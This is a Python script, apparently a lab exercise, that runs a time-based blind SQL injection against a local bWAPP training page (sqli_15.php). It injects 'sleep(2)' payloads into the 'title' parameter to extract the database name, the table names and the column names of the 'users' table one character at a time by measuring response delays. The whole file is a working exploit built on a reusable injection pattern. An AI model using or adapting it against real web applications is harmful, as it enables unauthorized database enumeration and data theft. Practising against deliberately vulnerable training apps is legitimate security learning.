from re import I
import requests
import time

HEADER = {
    "Cookie": "PHPSESSID=fb2341d5ccf51b0b8e5df2d51f47eb08; security_level=0"
}

BASE_URL = 'http://localhost/dashboard/bWAPPv2/bWAPP/sqli_15.php?'


def get_database_length():
    count = 0
    
    for i in range(100):
        url = BASE_URL + "title=Iron Man' and length(database()) = {} and sleep(2) -- &action=search".format(i)
        start_time = time.time()
        requests.get(url, headers=HEADER)
        if time.time() - start_time > 1:
            # print("length of database is {}".format(i))
            count = i

    return count

def get_database_name(count):
    arr = []
    namedb = ""
    for i in range(count+1):
        for j in range (33,127):
            url = BASE_URL + "title=Iron Man' and ascii(substr(database(),{},1)) = {} and sleep(2) -- &action=search".format(i,j)
            start_time = time.time()
            requests.get(url, headers=HEADER)
            if time.time() - start_time > 1:
                arr.append(chr(j))
    for data in arr:
        namedb += data
    print("Database name is '{}'".format(namedb))
    
def get_number_of_table():
    count = 0
    for i in range(100):
        url = BASE_URL + "title=Iron Man' and (SELECT count(table_name) FROM information_schema.tables WHERE table_schema = database()) = {} and sleep(2) -- &action=search".format(i)
        start_time = time.time()
        requests.get(url, headers=HEADER)
        if time.time() - start_time > 1:
            #print("Database exist {} tables".format(i))
            count = i
    return count

def get_each_table_length(count):
    for i in range(count+1):
        for j in range(100):
            url = BASE_URL + "title=Iron Man' and (SELECT length(table_name) FROM information_schema.tables WHERE table_schema = database() limit {}, 1) = {} and sleep(2) -- &action=search".format(i,j)
            start_time = time.time()
            requests.get(url, headers=HEADER)
            if time.time() - start_time > 1:
                get_table_name_of_each_table(i,j)
                #print("Table {} length {}".format(i+1,j))
                
def get_table_name_of_each_table(index, count):
    for i in range(count + 1):
        name = ""
        for j in range(33,127):
            url = BASE_URL + "title=Iron man' and ascii(substr((SELECT table_name FROM information_schema.tables WHERE table_schema = database() limit {}, 1),{},1))={} and sleep(2) -- &action=search".format(index,i,j)
            start_time = time.time()
            requests.get(url, headers=HEADER)
            if time.time() - start_time > 1:
                name += chr(j)
        print(name)
                
def get_column_count_of_user():
    count = 0
    for i in range(100):
        url = BASE_URL + "title=Iron Man' and (SELECT count(column_name) FROM information_schema.COLUMNS WHERE table_name='users' and table_schema = 'bWAPP')={} and sleep(2) -- &action=search".format(i)
        start_time = time.time()
        requests.get(url, headers=HEADER)
        if time.time() - start_time > 1:
            count = i
            #print("Total column is {}".format(i))
    return count

def get_each_column_name_length_of_user(count):
    for i in range(count + 1):
        for j in range(100):
            url = BASE_URL + "title=Iron Man' and (SELECT length(column_name) FROM information_schema.COLUMNS WHERE table_name='users' and table_schema = 'bWAPP' limit {}, 1) = {} and sleep(2) -- &action=search".format(i,j)
            start_time = time.time()
            requests.get(url, headers=HEADER)
            if time.time() - start_time > 1:
                get_each_column_name_of_user(i,j)
                # print("Column {} have {} characters".format(i+1,j))
                
def get_each_column_name_of_user(index, count):
    for i in range(count+1):
        name=""
        for j in range(33,127):
            url = BASE_URL + "title=Iron Man' and ascii(substr((SELECT column_name FROM information_schema.COLUMNS WHERE table_name='users' and table_schema = 'bWAPP' limit {}, 1),{},1)) = {} and sleep(2) -- &action=search".format(index,i,j)
            start_time = time.time()
            requests.get(url, headers=HEADER)
            if time.time() - start_time > 1:
                name += chr(j)
        print(name)
           
if __name__ == '__main__':
    #get_database_name(get_database_length())
    #get_each_table_length(get_number_of_table())
    get_each_column_name_length_of_user(get_column_count_of_user())
    